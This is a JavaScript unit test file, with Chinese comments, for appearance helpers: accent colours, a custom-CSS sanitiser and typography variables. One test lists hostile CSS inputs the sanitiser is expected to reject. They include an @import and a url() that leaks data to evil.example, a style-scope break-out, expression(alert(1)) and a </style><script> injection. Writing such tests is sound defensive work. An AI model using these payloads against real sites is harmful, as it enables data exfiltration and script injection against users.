// 外观单测：强调色、译文自定义 CSS 清洗、排版参数（纯函数）。
// 运行：node test/appearance.test.mjs
import assert from 'node:assert/strict';

import { accentHex, isValidAccent, isDefaultAccent, sanitizeTranslationCss, typographyVars, ACCENT_PRESETS } from '../lib/appearance.js';

let pass = 0;
let fail = 0;

function t(name, fn) {
  try {
    fn();
    pass += 1;
    console.log('  ✓ ' + name);
  } catch (err) {
    fail += 1;
    console.log('  ✗ ' + name + '\n      ' + (err && err.message));
  }
}

console.log('\n[强调色]');

t('预设与自定义颜色都认，其它值回到默认', () => {
  assert.equal(accentHex('teal'), ACCENT_PRESETS.find((p) => p.value === 'teal').hex);
  assert.equal(accentHex('#ABCDEF'), '#abcdef');
  assert.equal(accentHex('red; background: url(x)'), ACCENT_PRESETS[0].hex);
  assert.ok(isValidAccent('#123456') && isValidAccent('rose'));
  assert.ok(!isValidAccent('#12345') && !isValidAccent('javascript:'));
});

t('默认强调色（violet / 空 / 非法）不覆盖原来的配色', () => {
  assert.ok(isDefaultAccent('violet') && isDefaultAccent('') && isDefaultAccent('nope'));
  assert.ok(!isDefaultAccent('teal') && !isDefaultAccent('#00aa00'));
});

console.log('\n[译文自定义 CSS]');

t('只收「属性: 值」声明，清洗成一行', () => {
  const r = sanitizeTranslationCss('color: #555;\n font-size:0.95em ;letter-spacing: .02em');
  assert.deepEqual(r.errors, []);
  assert.equal(r.css, 'color: #555; font-size: 0.95em; letter-spacing: .02em');
});

t('跳出作用域、引外部资源、脚本写法一律拒绝', () => {
  [
    'color: red } body { display: none',
    '@import "https://evil.example/x.css"',
    'background: url(https://evil.example/?leak)',
    'background-image: image-set("a.png" 1x)',
    'width: expression(alert(1))',
    'color: red</style><script>',
    'color: \\72 ed',
    'color: red /* hi */'
  ].forEach((bad) => {
    const r = sanitizeTranslationCss(bad);
    assert.equal(r.css, '', bad);
    assert.ok(r.errors.length > 0, bad);
  });
});

t('写法不对给出具体提示', () => {
  assert.match(sanitizeTranslationCss('just text').errors[0], /属性: 值/);
  assert.match(sanitizeTranslationCss('co lor: red').errors[0], /属性名/);
});

t('空内容合法，什么都不注入', () => {
  assert.deepEqual(sanitizeTranslationCss('   '), { css: '', errors: [] });
});

console.log('\n[译文排版]');

t('全是默认值时返回 null（不覆盖原文排版）', () => {
  assert.equal(typographyVars({ typoFontScale: 100, typoLineHeight: 0, typoGap: 3, typoIndent: false }), null);
  assert.equal(typographyVars({}), null);
});

t('改了任一项就输出整套变量，越界值被夹住', () => {
  const v = typographyVars({ typoFontScale: 300, typoLineHeight: 1.8, typoGap: 6, typoIndent: true });
  assert.equal(v['--dt-font-scale'], '1.6');
  assert.equal(v['--dt-line-height'], '1.8');
  assert.equal(v['--dt-gap'], '0.6em');
  assert.equal(v['--dt-indent'], '2em');
  assert.equal(typographyVars({ typoFontScale: 90 })['--dt-line-height'], 'inherit');
});

console.log('\n' + pass + ' 通过 / ' + fail + ' 失败');
if (fail) process.exit(1);
